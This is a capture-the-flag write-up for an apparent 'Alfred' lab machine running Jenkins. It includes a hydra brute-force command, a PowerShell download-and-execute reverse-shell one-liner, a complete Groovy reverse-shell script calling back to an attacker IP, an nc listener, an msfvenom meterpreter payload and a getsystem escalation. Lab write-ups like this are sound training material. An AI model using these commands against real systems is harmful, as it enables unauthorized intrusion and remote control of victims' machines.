# Alfred

## 1 How Many Ports Are Open

*3*
```
portscan 10.10.248.54 0 2

```
[portscan](https://github.com/kranercc/crazyPortScanner)

## 2 What is the username and password for the log in panel

*admin:admin*
```
hydra -L usernames.lst -P rockyou.txt -u  -s 8080 -m '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError' 10.10.248.54 http-post-form -I
```

## Exploiting The Target

Insted of doing this:

 _Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_

_You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server_

I have found the Groovy Console on jenkins server and run a custom reverse shell script

```
String host="10.11.13.150";
int port=6942;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Initial Access

I listen with nc 


```
nc -nlvp 6942
```

Then craft an EXE to run on the machine to get meterpreter


```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.13.150 LPORT=5555 -f exe -o krane.exe

```

I initialize msfconsole then type


## Priv Esc

```
getsystem
```

on the meterpreter and it automatically privilege escalated




